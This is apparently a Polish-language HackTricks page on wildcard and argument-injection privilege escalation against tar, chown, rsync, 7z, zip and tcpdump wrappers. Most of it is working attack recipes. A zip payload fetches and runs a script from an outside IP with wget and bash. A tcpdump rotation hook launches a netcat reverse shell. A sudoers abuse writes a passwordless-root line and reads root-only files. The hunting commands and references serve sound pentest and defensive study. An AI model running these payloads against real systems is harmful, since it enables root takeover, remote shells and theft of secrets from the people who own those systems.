# Dodatkowe sztuczki z Wildcards

{{#include ../../banners/hacktricks-training.md}}

> **Argument injection** z użyciem wildcard (znanego również jako *glob*) występuje, gdy uprzywilejowany skrypt uruchamia binarny program Unix, taki jak `tar`, `chown`, `rsync`, `zip`, `7z`, … z nieujętym w cudzysłów wildcard, takim jak `*`.
> Ponieważ powłoka rozwija wildcard **przed** uruchomieniem programu, attacker, który może tworzyć pliki w katalogu roboczym, może przygotować nazwy plików zaczynające się od `-`, aby zostały zinterpretowane jako **opcje zamiast danych**, skutecznie przemycając dowolne flagi, a nawet komendy.
> Ta strona zawiera najprzydatniejsze primitives, najnowsze badania i nowoczesne metody detekcji na lata 2023–2025.

## chown / chmod

Możesz **skopiować właściciela/grupę lub bity uprawnień dowolnego pliku**, wykorzystując flagę `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Gdy root później wykona coś takiego:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` zostaje wstrzyknięte, powodując, że *wszystkie* pasujące pliki dziedziczą ownership/permissions pliku `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
Zobacz także klasyczny paper DefenseCode, aby uzyskać szczegóły.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Wykonuj arbitrary commands, nadużywając funkcji **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Gdy root uruchomi np. `tar -czf /root/backup.tgz *`, `shell.sh` zostanie wykonany jako root.

### bsdtar / macOS 14+

Domyślny `tar` w nowszych wersjach macOS (oparty na `libarchive`) nie implementuje `--checkpoint`, ale nadal można uzyskać wykonanie kodu za pomocą flagi **--use-compress-program**, która pozwala określić zewnętrzny kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Gdy uprzywilejowany skrypt wykonuje `tar -cf backup.tar *`, zostanie uruchomiony `/bin/sh`.

---

## rsync

`rsync` pozwala nadpisać zdalną powłokę, a nawet zdalny plik binarny za pomocą flag wiersza poleceń rozpoczynających się od `-e` lub `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Jeśli root później zarchiwizuje katalog za pomocą `rsync -az * backup:/srv/`, wstrzyknięta flaga uruchomi Twój shell po stronie zdalnej.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (tryb `rsync`).

---

## 7-Zip / 7z / 7za

Nawet gdy uprzywilejowany skrypt *defensywnie* poprzedza wildcard ciągiem `--` (aby zatrzymać parsowanie opcji), format 7-Zip obsługuje **pliki list plików**, gdy nazwa pliku jest poprzedzona `@`. Połączenie tego z symlinkiem pozwala na *exfiltrate dowolnych plików*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Jeśli root wykona coś takiego:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i przerwie działanie, **wypisując zawartość na stderr**.

Działa to również w przypadku `-- *`, ponieważ CLI 7-Zip jawnie akceptuje zarówno zwykłe nazwy plików, jak i `@listfiles` jako argumenty pozycyjne, dlatego literalna nazwa pliku, taka jak `@root.txt`, nadal jest traktowana w specjalny sposób.

---

## zip

Istnieją dwa bardzo praktyczne primitives, gdy aplikacja przekazuje kontrolowane przez użytkownika nazwy plików do `zip` (za pomocą wildcarda lub przez wyliczanie nazw bez `--`).

- RCE via test hook: `-T` włącza „test archive”, a `-TT <cmd>` zastępuje tester dowolnym programem (długa forma: `--unzip-command <cmd>`). Jeśli możesz wstrzyknąć nazwy plików zaczynające się od `-`, rozdziel flagi na osobne nazwy plików, aby działało parsowanie short options:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Uwagi
- NIE próbuj używać pojedynczej nazwy pliku, takiej jak `'-T -TT <cmd>'` — krótkie opcje są parsowane znak po znaku i to nie zadziała. Użyj osobnych tokenów, jak pokazano.
- Jeśli aplikacja usuwa ukośniki z nazw plików, pobierz dane z samego hosta/adresu IP (domyślna ścieżka `/index.html`) i zapisz je lokalnie za pomocą `-O`, a następnie wykonaj.
- Możesz debugować parsing za pomocą `-sc` (pokaż przetworzone argv) lub `-h2` (więcej pomocy), aby zrozumieć, jak przetwarzane są tokeny.

Przykład (lokalne działanie w zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Eksfiltracja/leak danych: Jeśli warstwa webowa zwraca stdout/stderr `zip` (częste w przypadku naiwnych wrapperów), wstrzyknięte flagi, takie jak `--help`, lub błędy wynikające z nieprawidłowych opcji pojawią się w odpowiedzi HTTP, potwierdzając command-line injection i ułatwiając dostrajanie payloadu.

---

## Dodatkowe binaries podatne na wildcard injection (szybka lista 2023-2025)

Poniższe commands były wykorzystywane w nowoczesnych CTF-ach i rzeczywistych środowiskach. Payload jest zawsze tworzony jako *nazwa pliku* w zapisywalnym katalogu, który później zostanie przetworzony za pomocą wildcard:

| Binary | Flaga do wykorzystania | Efekt |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → dowolny `@file` | Odczyt zawartości pliku |
| `flock` | `-c <cmd>` | Wykonanie command |
| `git`   | `-c core.sshCommand=<cmd>` | Wykonanie command przez git over SSH |
| `scp`   | `-S <cmd>` | Uruchomienie dowolnego programu zamiast ssh |

Te primitives są mniej powszechne niż klasyczne przypadki *tar/rsync/zip*, ale warto je sprawdzać podczas huntingu.

---

## Hunting podatnych wrapperów i zadań

Najnowsze case studies pokazały, że wildcard/argv injection nie jest już wyłącznie problemem **cron + tar**. Ta sama klasa błędów nadal pojawia się w:

- funkcjach webowych, które „pobierają wszystko jako zip/tar” z kontrolowanych przez attackera katalogów uploadów
- powłokach debugowania vendorów/appliance'ów, które udostępniają wrapper **tcpdump** z kontrolowanymi przez attackera polami nazwy pliku/filtra
- zadaniach backupu lub rotacji, które uruchamiają `tar`, `rsync`, `7z`, `zip`, `chown` lub `chmod` na zapisywalnych katalogach

Przydatne commands triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Szybkie heurystyki:

- `-- *` to dobre rozwiązanie dla wielu narzędzi GNU, ale **nie** dla `7z`/`7za`, ponieważ `@listfiles` są analizowane osobno.
- W przypadku `zip` szukaj wrapperów, które bezpośrednio wyliczają nazwy plików kontrolowane przez użytkownika; dzielenie short-option (`-T` + `-TT <cmd>`) nadal działa nawet bez shell glob.
- W przypadku `tcpdump` zwróć szczególną uwagę na wrappery, które pozwalają kontrolować **nazwy plików wyjściowych**, **ustawienia rotacji** lub argumenty **replay pliku przechwycenia**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Gdy restricted shell lub vendor wrapper buduje wiersz poleceń `tcpdump`, łącząc pola kontrolowane przez użytkownika (np. parametr „file name”) bez ścisłego quoting/validation, można przemycić dodatkowe flagi `tcpdump`. Połączenie `-G` (rotacja zależna od czasu), `-W` (ograniczenie liczby plików) oraz `-z <cmd>` (polecenie wykonywane po rotacji) umożliwia arbitrary command execution jako użytkownik uruchamiający tcpdump (często root na appliance).

Warunki wstępne:

- Możesz wpływać na `argv` przekazywane do `tcpdump` (np. przez wrapper taki jak `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper nie sanityzuje spacji ani tokenów zaczynających się od `-` w polu file name.

Classic PoC (uruchamia reverse shell script ze ścieżki z możliwością zapisu):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Szczegóły:

- `-G 1 -W 1` wymusza natychmiastową rotację po pierwszym pasującym pakiecie.
- `-z <cmd>` uruchamia polecenie post-rotate raz na każdą rotację. Wiele buildów wykonuje `<cmd> <savefile>`. Jeśli `<cmd>` jest skryptem/interpreterem, upewnij się, że obsługa argumentów odpowiada Twojemu payloadowi.

Warianty bez nośników wymiennych:

- Jeśli masz inną primitive umożliwiającą zapis plików (np. osobny command wrapper pozwalający na przekierowanie wyjścia), umieść swój skrypt w znanej ścieżce i wywołaj `-z /bin/sh /path/script.sh` lub `-z /path/script.sh`, zależnie od semantyki platformy.
- Niektóre vendor wrappers wykonują rotację do lokalizacji kontrolowanych przez atakującego. Jeśli możesz wpłynąć na ścieżkę po rotacji (symlink/directory traversal), możesz skierować `-z` tak, aby wykonało zawartość, nad którą masz pełną kontrolę, bez użycia zewnętrznych nośników.

---

## sudoers: tcpdump z wildcardami/dodatkowymi argumentami → dowolny zapis/odczyt i root

Bardzo częsty sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemy
- Glob `*` i liberalne wzorce ograniczają tylko pierwszy argument `-w`. `tcpdump` akceptuje wiele opcji `-w`; wygrywa ostatnia.
- Reguła nie wymusza innych opcji, więc dozwolone są `-Z`, `-r`, `-V` itd.

Primitives
- Nadpisz docelową ścieżkę za pomocą drugiego `-w` (pierwszy spełnia tylko warunek sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal wewnątrz pierwszego `-w`, aby wyjść poza ograniczone drzewo:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Wymuś właściciela plików wyjściowych za pomocą `-Z root` (tworzy pliki należące do użytkownika root w dowolnym miejscu):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Zapis dowolnej zawartości poprzez odtworzenie spreparowanego PCAP za pomocą `-r` (np. w celu dodania wpisu do sudoers):

<details>
<summary>Utwórz PCAP zawierający dokładny payload ASCII i zapisz go jako root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Odczyt dowolnego pliku/wyciek sekretów za pomocą `-V <file>` (interpretuje listę savefiles). Diagnostyka błędów często wyświetla linie, powodując wyciek zawartości:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referencje

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Pełny łańcuch exploitacji](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Wykryto potencjalny Shell przez Wildcard Injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
